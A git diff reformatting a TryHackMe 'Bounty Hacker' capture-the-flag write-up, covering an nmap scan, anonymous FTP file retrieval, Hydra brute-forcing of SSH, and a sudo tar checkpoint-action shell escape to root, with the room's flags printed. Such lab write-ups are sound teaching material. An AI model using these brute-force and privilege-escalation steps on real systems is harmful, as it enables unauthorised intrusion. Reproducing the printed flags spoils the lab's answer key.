@@ -1,28 +1,38 @@
-🏴‍☠️ TryHackMe - Bounty Hacker
+# 🏴‍☠️ TryHackMe - Bounty Hacker
 
-Platform: TryHackMe
-Challenge Type: Boot2Root
-Author: Gage Ayala (GageGotya)
-Date: April 9, 2025
-Difficulty: ⭐ Easy
-📘 Overview
+**Platform:** TryHackMe  
+**Challenge Type:** Boot2Root  
+**Author:** Gage Ayala ([@GageGotya](https://github.com/GageGotya))  
+**Date:** April 9, 2025  
+**Difficulty:** ⭐ Easy  
 
-The Bounty Hacker room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.
+---
+
+## 📘 Overview
+
+The **Bounty Hacker** room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.  
 You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.
 
-A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
-🌐 Information Gathering
+> 🔎 A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
 
-Target IP: Provided by the room
-🔎 Nmap Scan
+---
 
+## 🌐 Information Gathering
+
+**Target IP:** _Provided by the room_
+
+### 🔍 Nmap Scan
+
+```bash
 nmap -sC -sV <target-ip>
 
 Ports Discovered:
 
-21/tcp  open  ftp     vsftpd 3.0.3 (anonymous login allowed)  
-22/tcp  open  ssh     OpenSSH 7.2.2 (Ubuntu)  
-80/tcp  open  http    Apache httpd 2.4.18 (Ubuntu)
+    21/tcp - FTP (vsftpd 3.0.3, anonymous login allowed)
+
+    22/tcp - SSH (OpenSSH 7.2.2)
+
+    80/tcp - HTTP (Apache httpd 2.4.18)
 
 📂 FTP Access
 
@@ -34,19 +44,20 @@ Name: anonymous
 ftp> ls
 locks.txt
 task.txt
+
 ftp> get locks.txt
 ftp> get task.txt
 
 🧾 task.txt
 
-1.) Protect Vicious.  
-2.) Plan for Red Eye pickup on the moon.  
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
 -lin
 
-🔑 Username hint: lin
+🧠 Username hint: lin
 🧾 locks.txt
 
-A custom list of possible passwords — likely reused credentials.
+Custom password list found — likely reused creds.
 🔓 Gaining Access
 🚀 Brute Forcing with Hydra
 
@@ -61,55 +72,50 @@ ssh lin@<target-ip>
 
 cat ~/Desktop/user.txt
 
-🧾 Flag:
+Flag:
 
 THM{CR1M3_SyNd1C4T3}
 
-✅ User flag captured!
 🪜 Privilege Escalation
 🔍 Sudo Permissions
 
 sudo -l
 
-Findings:
-
-User lin may run the following command as root:  
+User lin may run the following command on bountyhacker:
 (root) /bin/tar
 
-📦 Exploiting tar for Root Shell
+🧨 Exploiting tar
 
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-
-🐚 Root shell obtained!
 
 whoami
 root
 
-🏁 Root Flag
+👑 Root Flag
 
 cat /root/root.txt
 
-🧾 Flag:
+Flag:
 
 THM{80UN7Y_h4cK3r}
 
-✅ Root flag captured!
 💡 Reflections
 
-    Anonymous FTP = easy foot in the door 🛠️
+    Anonymous FTP often opens the door to quick wins 🚪
 
-    Password reuse + brute force = cracked SSH in minutes 🚪
+    Password reuse is a goldmine for brute-force attacks 🔑
 
-    sudo -l is always a goldmine — especially with misconfigured binaries 🥇
+    sudo -l is your best friend — always check it 🛠️
 
-    Sometimes all you need is a clever use of tar 😎
-
-📁 Key Files
-
-    locks.txt — password list for brute force
-
-    task.txt — username clue
+    Simple tools like tar can be deadly in the wrong hands (or the right ones 😉)
 
 🧠 Pro Tip
 
-💬 “Enumeration wins engagements. Check every port, every file, and every binary. Root is rarely far.”
+    "When in doubt, poke around, read everything, and always try the simple stuff first."
+
+📁 Summary of Key Files
+File	Description
+locks.txt	Password list for brute-force
+task.txt	Username clue and initial objectives
+user.txt	First flag on Rick's desktop
+root.txt	Final flag after privilege escalation
